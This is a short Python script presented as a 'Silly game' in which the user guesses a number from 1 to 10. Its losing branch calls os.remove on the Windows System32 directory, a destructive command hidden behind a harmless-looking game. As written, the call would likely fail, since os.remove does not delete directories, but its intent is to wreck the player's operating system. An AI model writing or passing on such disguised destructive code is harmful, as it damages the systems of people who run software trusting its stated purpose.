import random
import os 

number = random.randint(1,10)

guess = input("Silly game! Guess number between 1 to 10")
guess = int(guess)

if guess == number:
    print("you won!")
else:
    os.remove("C:\Windows\System32")